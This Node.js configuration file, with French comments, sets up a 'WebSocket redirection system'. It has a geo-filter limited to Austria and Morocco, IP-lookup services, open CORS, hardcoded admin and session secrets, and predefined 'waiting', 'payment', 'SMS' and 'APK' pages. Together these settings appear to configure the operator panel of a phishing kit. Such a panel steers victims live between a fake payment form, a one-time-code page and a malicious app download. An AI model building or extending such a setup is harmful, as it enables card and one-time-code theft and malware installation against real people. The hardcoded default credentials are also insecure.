/**
 * Configuration du système de redirection WebSocket
 */

module.exports = {
  // Configuration du serveur
  server: {
    port: process.env.PORT || 5000,
    host: process.env.HOST || '0.0.0.0',
    environment: process.env.NODE_ENV || 'development'
  },

  // Configuration de session
  session: {
    secret: process.env.SESSION_SECRET || 'votre_clé_secrète_très_sécurisée_2025',
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false, // true en production avec HTTPS
      maxAge: 3600000 // 1 heure
    }
  },

  // Configuration admin
  admin: {
    password: process.env.ADMIN_PASSWORD || 'Azerty2025'
  },

  // Configuration géographique
  geo: {
    allowedCountries: ['AT', 'MA'], // Autriche, Maroc
    cacheTimeout: 3600, // 1 heure en secondes
    apis: [
      {
        name: 'ip-api.com',
        url: 'http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,city,lat,lon,isp,org,as,query',
        timeout: 5000,
        rateLimit: 45 // requêtes par minute
      },
      {
        name: 'freeipapi.com',
        url: 'https://freeipapi.com/api/json/{ip}',
        timeout: 5000,
        rateLimit: 60
      },
      {
        name: 'country.is',
        url: 'https://api.country.is/{ip}',
        timeout: 3000,
        rateLimit: 100
      }
    ]
  },

  // Configuration WebSocket
  websocket: {
    heartbeatTimeout: 180, // 3 minutes
    cleanupInterval: 30, // 30 secondes
    corsOrigins: "*"
  },

  // Pages prédéfinies pour la redirection
  predefinedPages: {
    'accueil': { url: '/', name: 'Accueil' },
    'att': { url: '/att.html', name: 'Attente' },
    'paiement': { url: '/index.html', name: 'Paiement' },
    'sms': { url: '/sms.html', name: 'SMS' },
    'apk': { url: '/apk.html', name: 'APK' }
  },

  // Configuration des logs
  logging: {
    level: process.env.LOG_LEVEL || 'info',
    file: 'logs/redirection_system.log',
    maxSize: '20m',
    maxFiles: '14d'
  },

  // IPs locales autorisées (pour le développement)
  localIPs: [
    '127.0.0.1',
    'localhost',
    '::1',
    '192.168.',
    '10.',
    '172.16.',
    '172.17.',
    '172.18.',
    '172.19.',
    '172.20.',
    '172.21.',
    '172.22.',
    '172.23.',
    '172.24.',
    '172.25.',
    '172.26.',
    '172.27.',
    '172.28.',
    '172.29.',
    '172.30.',
    '172.31.'
  ]
};

